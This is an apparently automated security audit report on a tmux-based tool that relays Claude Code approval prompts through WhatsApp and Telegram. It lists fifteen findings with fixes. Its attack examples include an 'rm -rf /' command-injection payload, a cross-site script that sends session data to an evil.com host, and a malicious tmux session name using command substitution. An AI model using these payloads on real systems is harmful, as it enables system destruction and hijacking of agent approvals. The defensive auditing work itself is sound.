# Security Vulnerability Audit Report

**Project:** Claude Code Wingman (Project-Iceman)
**Audit Date:** 2026-02-03
**Auditor:** Automated Security Analysis
**Scope:** Full codebase review - Shell scripts, Node.js dashboard, configuration

---

## Executive Summary

This security audit identified **15 vulnerabilities** across the Claude Code Wingman orchestration system. The project is a tmux-based automation tool for managing Claude Code sessions with remote approval capabilities via WhatsApp/Telegram webhooks.

### Risk Summary

| Severity | Count | Action Required |
|----------|-------|-----------------|
| **Critical** | 3 | Immediate remediation required |
| **High** | 4 | Remediate before production use |
| **Medium** | 5 | Remediate in near-term |
| **Low** | 3 | Address when convenient |

### Key Concerns

1. **Command Injection vulnerabilities** in the dashboard allow arbitrary code execution
2. **No authentication** on WebSocket connections - anyone on the network can send approval commands
3. **Insecure credential storage** with plaintext tokens in configuration files
4. **CORS misconfiguration** allows cross-origin attacks from any website

**Overall Risk Rating: HIGH** - This tool should NOT be exposed to untrusted networks without significant security hardening.

---

## Critical Findings

### CRIT-01: Command Injection via Unquoted Shell Parameter

**File:** `dashboard/tmux-dashboard.js:137`
**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-78 (OS Command Injection)

**Vulnerable Code:**
```javascript
socket.on('session:approve', (data) => {
  const { name, action } = data;
  const scriptPath = path.join(__dirname, '../lib/handle-approval.sh');
  execSync(`"${scriptPath}" ${action} "${name}"`, { timeout: 5000 });
  //                        ^^^^^^^^^ UNQUOTED - allows shell metacharacters
});
```

**Attack Vector:**
An attacker can send a malicious WebSocket message with a crafted `action` parameter containing shell metacharacters:

```javascript
// Malicious client payload
socket.emit('session:approve', {
  name: 'any-session',
  action: 'approve; rm -rf / #'  // Shell injection
});
```

**Impact:**
- Arbitrary command execution as the user running the dashboard
- Full system compromise possible
- Data exfiltration, privilege escalation, lateral movement

**Remediation:**
```javascript
// Option 1: Use execFile with argument array (RECOMMENDED)
const { execFileSync } = require('child_process');
execFileSync(scriptPath, [action, name], { timeout: 5000 });

// Option 2: Validate action against whitelist
const VALID_ACTIONS = ['approve', 'always', 'deny'];
if (!VALID_ACTIONS.includes(action)) {
  throw new Error('Invalid action');
}
```

---

### CRIT-02: No WebSocket Authentication

**File:** `dashboard/tmux-dashboard.js:107-143`
**CVSS Score:** 9.1 (Critical)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Vulnerable Code:**
```javascript
io.on('connection', (socket) => {
  console.log(`[*] Client connected: ${socket.id}`);
  // NO AUTHENTICATION CHECK - any connection is accepted

  socket.on('session:approve', (data) => {
    // Directly executes approval without verifying client identity
    execSync(`"${scriptPath}" ${action} "${name}"`, { timeout: 5000 });
  });
});
```

**Attack Vector:**
Any client that can reach port 3333 can:
1. Connect to the WebSocket
2. List all active Claude Code sessions
3. Send approval/deny commands to any session
4. Potentially inject commands (see CRIT-01)

**Impact:**
- Unauthorized approval of dangerous operations
- Denial of service by denying all approvals
- Combined with CRIT-01 for full system compromise

**Remediation:**
```javascript
// Add token-based authentication
const DASHBOARD_TOKEN = process.env.DASHBOARD_TOKEN;

io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token || token !== DASHBOARD_TOKEN) {
    return next(new Error('Authentication required'));
  }
  next();
});
```

---

### CRIT-03: Permissive CORS Configuration

**File:** `dashboard/tmux-dashboard.js:9-11`
**CVSS Score:** 8.1 (High/Critical)
**CWE:** CWE-942 (Permissive Cross-domain Policy)

**Vulnerable Code:**
```javascript
const io = new Server(server, {
  cors: { origin: '*' }  // Allows ANY origin
});
```

**Attack Vector:**
A malicious website can connect to the dashboard from any user's browser:

```html
<!-- Attacker's website: evil.com -->
<script src="https://cdn.socket.io/socket.io.min.js"></script>
<script>
  // Connect to victim's localhost dashboard
  const socket = io('http://localhost:3333');
  socket.on('session:add', (session) => {
    // Exfiltrate session info to attacker
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(session)
    });
  });
</script>
```

**Impact:**
- Cross-site WebSocket hijacking
- Session enumeration from user's browser
- Potential command injection via CRIT-01

**Remediation:**
```javascript
const io = new Server(server, {
  cors: {
    origin: ['http://localhost:3333', 'http://127.0.0.1:3333'],
    credentials: true
  }
});
```

---

## High Severity Findings

### HIGH-01: Shell Injection via Session Name in tmux Commands

**File:** `dashboard/tmux-dashboard.js:43, 57`
**CVSS Score:** 7.5
**CWE:** CWE-78 (OS Command Injection)

**Vulnerable Code:**
```javascript
function capturePane(sessionName) {
  const output = execSync(`tmux capture-pane -t "${sessionName}" -p -e`, {
    //                                          ^^^^^^^^^^^^^
    // Session name from external source interpolated into shell command
  });
}

function getSessionStatus(sessionName) {
  const output = execSync(`${path.join(__dirname, '../lib/session-status.sh')} "${sessionName}" --json`, {
    //                                                                          ^^^^^^^^^^^^^
  });
}
```

**Attack Vector:**
If an attacker can create a tmux session with a malicious name:
```bash
# Create malicious session name
tmux new-session -d -s '$(whoami > /tmp/pwned)'
```

When the dashboard captures this session, command substitution occurs.

**Mitigating Factor:** Session names are validated in `claude-wingman.sh:125` with alphanumeric regex, but:
1. Sessions created outside wingman are not validated
2. Validation could be bypassed if other entry points exist

**Remediation:**
```javascript
const { execFileSync } = require('child_process');
// Use execFileSync with argument array
execFileSync('tmux', ['capture-pane', '-t', sessionName, '-p', '-e']);
```

---

### HIGH-02: JSON Injection in Shell Script

**File:** `lib/session-status.sh:66`
**CVSS Score:** 7.2
**CWE:** CWE-94 (Improper Control of Code Generation)

**Vulnerable Code:**
```bash
if [ "$JSON_OUTPUT" = true ]; then
    echo '{"status":"not_found","session":"'$SESSION_NAME'"}'
    #                                       ^^^^^^^^^^^^^
    # Direct interpolation without JSON escaping
fi
```

**Attack Vector:**
A session name containing JSON metacharacters can break the JSON structure:
```bash
# Session name: test","injected":"value
./session-status.sh 'test","injected":"value' --json
# Output: {"status":"not_found","session":"test","injected":"value"}
```

**Impact:**
- JSON injection affecting downstream parsers
- Potential for more severe attacks if output is processed unsafely

**Remediation:**
```bash
# Use jq for safe JSON construction
if [ "$JSON_OUTPUT" = true ]; then
    jq -n --arg session "$SESSION_NAME" '{"status":"not_found","session":$session}'
fi
```

---

### HIGH-03: Sensitive Information Exposure in Notifications

**File:** `master-monitor.sh:155-243`
**CVSS Score:** 6.5
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Vulnerable Code:**
```bash
extract_approval_details() {
    # Extracts and sends raw command content to external service
    if echo "$context" | grep -qE "echo|rm |cat |mkdir|chmod|curl|wget|git "; then
        details=$(echo "$context" | grep -E "echo|rm |cat |mkdir|chmod|curl|wget|git " | head -1)
    fi
    # ...
}

send_notification() {
    local message="🔒 Session '$session' needs approval$reminder_text

$details  # <-- Contains extracted command with potential secrets

Reply with:..."
}
```

**Attack Vector:**
Commands containing secrets are extracted and sent via webhook:
```bash
# Claude Code runs:
curl -H "Authorization: Bearer sk-secret-api-key" https://api.example.com

# This gets extracted and sent to WhatsApp/Telegram
```

**Impact:**
- API keys, tokens, passwords leaked via notifications
- Credentials exposed in chat history
- Third-party services (WhatsApp, Telegram) see sensitive data

**Remediation:**
```bash
# Sanitize sensitive patterns before sending
sanitize_details() {
    local details="$1"
    # Mask bearer tokens
    details=$(echo "$details" | sed -E 's/Bearer [A-Za-z0-9_-]+/Bearer [REDACTED]/g')
    # Mask API keys
    details=$(echo "$details" | sed -E 's/(sk-|api_key=|token=)[A-Za-z0-9_-]+/\1[REDACTED]/g')
    echo "$details"
}
```

---

### HIGH-04: No Rate Limiting on Critical Endpoints

**File:** `dashboard/tmux-dashboard.js` (entire file)
**CVSS Score:** 6.0
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Vulnerable Code:**
```javascript
// No rate limiting on any socket events
socket.on('session:approve', (data) => {
  // Executes immediately for every request
  execSync(`"${scriptPath}" ${action} "${name}"`, { timeout: 5000 });
});

// Polling runs every 500ms regardless of client count
setInterval(pollSessions, POLL_INTERVAL);
```

**Attack Vector:**
1. **Approval spam:** Send thousands of approval requests to overwhelm the system
2. **DoS via connection flood:** Open many WebSocket connections
3. **Resource exhaustion:** Trigger many `execSync` calls simultaneously

**Impact:**
- Denial of service
- System resource exhaustion
- Potential for timing attacks

**Remediation:**
```javascript
const rateLimit = require('express-rate-limit');
const { RateLimiterMemory } = require('rate-limiter-flexible');

const socketLimiter = new RateLimiterMemory({
  points: 10,  // 10 requests
  duration: 60 // per minute
});

socket.on('session:approve', async (data) => {
  try {
    await socketLimiter.consume(socket.id);
    // Process request
  } catch (err) {
    socket.emit('error', 'Rate limit exceeded');
  }
});
```

---

## Medium Severity Findings

### MED-01: Plaintext Credential Storage

**File:** `~/.clawdbot/clawdbot.json` (external config)
**Referenced in:** `lib/send-notification.sh:63-68`
**CVSS Score:** 5.5
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Vulnerable Code:**
```bash
# Reads webhook token from plaintext JSON file
if [ -f "$CLAWDBOT_CONFIG" ]; then
    WEBHOOK_TOKEN=$(jq -r '.hooks.token // empty' "$CLAWDBOT_CONFIG" 2>/dev/null)
fi
```

**Expected Config File:**
```json
{
  "hooks": {
    "token": "super-secret-webhook-token"
  },
  "channels": {
    "telegram": {
      "allowedUserIds": ["123456789"]
    }
  }
}
```

**Impact:**
- Tokens readable by any process with file access
- Tokens may be backed up, synced, or exposed in logs
- No encryption at rest

**Remediation:**
1. Use OS keychain/secrets manager (macOS Keychain, Linux Secret Service)
2. Encrypt config file with user password
3. Use environment variables with restricted shell access:
```bash
# In ~/.bashrc with mode 600
export CLAWDBOT_WEBHOOK_TOKEN="token-here"
```

---

### MED-02: HTTP Used for Webhook Communication

**File:** `lib/send-notification.sh:14`
**CVSS Score:** 5.3
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Vulnerable Code:**
```bash
WEBHOOK_URL="${CLAWDBOT_WEBHOOK_URL:-http://127.0.0.1:18789/hooks/agent}"
#                                    ^^^^^ HTTP, not HTTPS

curl -s -X POST "$WEBHOOK_URL" \
  -H "Authorization: Bearer $WEBHOOK_TOKEN" \  # Token sent over HTTP
  -H "Content-Type: application/json" \
  -d "{...}"
```

**Attack Vector:**
Even on localhost, if the webhook URL is changed to a remote server:
- Bearer token transmitted in cleartext
- Message content (potentially sensitive) exposed
- Man-in-the-middle attacks possible

**Mitigating Factor:** Default is localhost, limiting exposure.

**Remediation:**
```bash
# Enforce HTTPS for non-localhost URLs
if [[ "$WEBHOOK_URL" != http://127.0.0.1* ]] && [[ "$WEBHOOK_URL" != http://localhost* ]]; then
    if [[ "$WEBHOOK_URL" != https://* ]]; then
        echo "Error: Remote webhooks must use HTTPS" >&2
        exit 1
    fi
fi
```

---

### MED-03: PID File Race Condition

**File:** `master-monitor.sh:78-89`
**CVSS Score:** 4.7
**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)

**Vulnerable Code:**
```bash
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE")
    if kill -0 "$OLD_PID" 2>/dev/null; then
        echo "Master monitor already running (PID $OLD_PID)" >&2
        exit 1
    fi
    rm -f "$PID_FILE"
fi
# RACE WINDOW: Another process could create PID file here
echo $$ > "$PID_FILE"
```

**Attack Vector:**
1. Process A checks: PID file doesn't exist
2. Process B checks: PID file doesn't exist
3. Process A writes PID file
4. Process B writes PID file (overwrites A)
5. Two monitors running, state corruption possible

**Impact:**
- Multiple monitor instances causing duplicate notifications
- State file corruption
- Unpredictable behavior

**Remediation:**
```bash
# Use atomic lock file with flock
LOCK_FILE="$STATE_DIR/master-monitor.lock"
exec 9>"$LOCK_FILE"
if ! flock -n 9; then
    echo "Master monitor already running" >&2
    exit 1
fi
echo $$ > "$PID_FILE"
```

---

### MED-04: Temporary Files in World-Readable Location

**File:** `master-monitor.sh:21-24`
**CVSS Score:** 4.3
**CWE:** CWE-377 (Insecure Temporary File)

**Vulnerable Code:**
```bash
STATE_DIR="/tmp/claude-orchestrator"
LOG_FILE="$STATE_DIR/master-monitor.log"
PID_FILE="$STATE_DIR/master-monitor.pid"
NOTIFY_STATE_DIR="$STATE_DIR/notify-state"

mkdir -p "$STATE_DIR" "$NOTIFY_STATE_DIR"
# No explicit permissions set - uses umask (often 022)
```

**Attack Vector:**
Other users on the system can:
1. Read log files containing session names and approval details
2. Modify state files to manipulate notification behavior
3. Delete PID file to cause multiple instances

**Impact:**
- Information disclosure to local users
- State manipulation attacks
- Denial of service

**Remediation:**
```bash
STATE_DIR="/tmp/claude-orchestrator-$(id -u)"
mkdir -p "$STATE_DIR" "$NOTIFY_STATE_DIR"
chmod 700 "$STATE_DIR"  # Owner-only access
```

---

### MED-05: Insufficient Input Validation in Approval Handler

**File:** `lib/handle-approval.sh:17-36`
**CVSS Score:** 4.0
**CWE:** CWE-20 (Improper Input Validation)

**Vulnerable Code:**
```bash
# Validates action but not session name
case "$ACTION" in
    approve|yes|y|1)
        RESPONSE="y"
        ;;
    # ... other cases
esac

# Session name only checked for existence, not format
if ! tmux has-session -t "$SESSION" 2>/dev/null; then
    echo "Error: Session '$SESSION' not found" >&2
    exit 1
fi

# Passes session name to another script
"$SCRIPT_DIR/approval-respond.sh" "$SESSION" "$RESPONSE"
```

**Gap:** While `claude-wingman.sh` validates session names, `handle-approval.sh` doesn't - relying on tmux's existence check only.

**Remediation:**
```bash
# Add session name validation
if [[ ! "$SESSION" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    echo "Error: Invalid session name format" >&2
    exit 1
fi
```

---

## Low Severity Findings

### LOW-01: Debug Information in Logs

**File:** `lib/send-notification.sh:83`
**CVSS Score:** 3.1
**CWE:** CWE-532 (Information Exposure Through Log Files)

**Vulnerable Code:**
```bash
echo "Sending notification via $CHANNEL to $TO..." >&2
# Logs phone number/Telegram ID
```

**Impact:** Phone numbers and Telegram IDs written to stderr, potentially captured in logs.

**Remediation:**
```bash
# Mask sensitive identifiers
MASKED_TO="${TO:0:4}****"
echo "Sending notification via $CHANNEL to $MASKED_TO..." >&2
```

---

### LOW-02: No Maximum Input Length Validation

**File:** `lib/session-send.sh:46-47`, `claude-wingman.sh:88`
**CVSS Score:** 3.0
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Vulnerable Code:**
```bash
# No length check on command input
COMMAND="$1"
tmux send-keys -t "$SESSION_NAME" "$COMMAND"
```

**Impact:**
- Extremely long inputs could cause buffer issues
- Memory exhaustion with malicious input

**Remediation:**
```bash
MAX_COMMAND_LENGTH=10000
if [ ${#COMMAND} -gt $MAX_COMMAND_LENGTH ]; then
    echo "Error: Command too long (max $MAX_COMMAND_LENGTH chars)" >&2
    exit 1
fi
```

---

### LOW-03: Unhandled Error in JSON Parsing

**File:** `dashboard/tmux-dashboard.js:61`
**CVSS Score:** 2.5
**CWE:** CWE-755 (Improper Handling of Exceptional Conditions)

**Vulnerable Code:**
```javascript
function getSessionStatus(sessionName) {
  try {
    const output = execSync(...);
    return JSON.parse(output);  // May throw on malformed JSON
  } catch (err) {
    return { status: 'unknown', details: '' };
  }
}
```

**Issue:** While errors are caught, malformed JSON from the shell script could cause unexpected behavior in edge cases.

**Remediation:**
```javascript
try {
  const parsed = JSON.parse(output);
  if (typeof parsed.status !== 'string') {
    throw new Error('Invalid status format');
  }
  return parsed;
} catch (err) {
  console.error('Failed to parse status:', err.message);
  return { status: 'unknown', details: '' };
}
```

---

## Remediation Priority Matrix

| ID | Severity | Effort | Priority | Timeline |
|----|----------|--------|----------|----------|
| CRIT-01 | Critical | Low | P0 | Immediate |
| CRIT-02 | Critical | Medium | P0 | Immediate |
| CRIT-03 | Critical | Low | P0 | Immediate |
| HIGH-01 | High | Low | P1 | 1 week |
| HIGH-02 | High | Low | P1 | 1 week |
| HIGH-03 | High | Medium | P1 | 1 week |
| HIGH-04 | High | Medium | P1 | 2 weeks |
| MED-01 | Medium | High | P2 | 1 month |
| MED-02 | Medium | Low | P2 | 2 weeks |
| MED-03 | Medium | Low | P2 | 2 weeks |
| MED-04 | Medium | Low | P2 | 2 weeks |
| MED-05 | Medium | Low | P2 | 2 weeks |
| LOW-01 | Low | Low | P3 | Backlog |
| LOW-02 | Low | Low | P3 | Backlog |
| LOW-03 | Low | Low | P3 | Backlog |

---

## Security Recommendations Summary

### Immediate Actions (Before Any Production Use)

1. **Fix Command Injection (CRIT-01):** Use `execFileSync` with argument arrays instead of string interpolation
2. **Add WebSocket Authentication (CRIT-02):** Implement token-based auth for all socket connections
3. **Restrict CORS (CRIT-03):** Limit origins to localhost only

### Short-Term Improvements

4. **Sanitize all shell inputs:** Validate session names everywhere, not just at creation
5. **Redact secrets from notifications:** Filter API keys, tokens, passwords before sending
6. **Add rate limiting:** Prevent abuse of approval endpoints
7. **Use atomic file locking:** Prevent race conditions in monitor daemon

### Long-Term Security Hardening

8. **Encrypt credentials:** Move from plaintext config to OS keychain or encrypted storage
9. **Implement audit logging:** Log all approval actions with timestamps and sources
10. **Add TLS for all communications:** Even localhost should use HTTPS for defense in depth
11. **Consider sandboxing:** Run dashboard in a container with limited privileges

---

## Conclusion

The Claude Code Wingman project has significant security vulnerabilities that require immediate attention before any production deployment. The critical command injection and authentication bypass issues could allow complete system compromise by any attacker with network access.

**Recommended immediate action:** Do not expose the dashboard to any network other than localhost until CRIT-01, CRIT-02, and CRIT-03 are remediated.

For local development use only, the current risk level is acceptable if the user understands:
- Only run on trusted local networks
- Never expose port 3333 to the internet
- Webhook tokens should be rotated regularly
- Notification content may contain sensitive information

---

*This audit was performed through static code analysis. Dynamic testing and penetration testing are recommended for comprehensive security validation.*
